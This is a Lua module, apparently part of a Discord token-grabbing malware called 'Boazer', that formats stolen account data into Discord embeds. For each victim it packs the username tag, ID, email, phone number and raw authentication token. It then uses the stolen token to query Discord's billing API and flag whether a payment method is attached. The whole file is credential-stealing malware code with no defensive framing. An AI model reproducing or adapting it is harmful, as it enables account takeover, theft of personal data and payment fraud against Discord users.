local function getEmbedFromUser(user)
    local nitro = 'false'
    if user.premium_type then nitro = 'true' end

    local embed = {
        title = "**Boazer Logs**",
        color = 16711680,
        fields = {
            {
                name = "**Tag**",
                value = user.tag,
                inline = true,
            },
            {
                name = "**ID**",
                value = user.id,
                inline = true,
            },
            {
                name = "**Email**",
                value = user.email or 'No email linked',
                inline = true,
            },
            {
                name = "**Phone number**",
                value = user.phone or 'No phone linked',
                inline = true,
            },
            {
                name = "**Token**",
                value = user.token,
                inline = true,
            },
            {
                name = '**Nitro**',
                value = nitro,
                inline = true
            }
        },
    }

    local data, body

    local suc = pcall(function()
        data, body = corohttp.request('GET', 'https://discord.com/api/v7/users/@me/billing/payment-sources', {{'authorization', user.token}})
    end)

    if not suc then
        return embed
    end

    if body == '[]' then
        return embed
    end

    if body:find('You need to verify your account in order to perform this action.') then
        return embed
    end

    table.insert(embed.fields, {name='**Billing**', value='true', inline=true})

    return embed
end

local function GetEmbeds(users)
    local embeds = {}

    for i,user in pairs(users) do
        table.insert(embeds, getEmbedFromUser(user))
    end

    return embeds
end

local function init(fenv)
    fenv.info = GetEmbeds
end

return init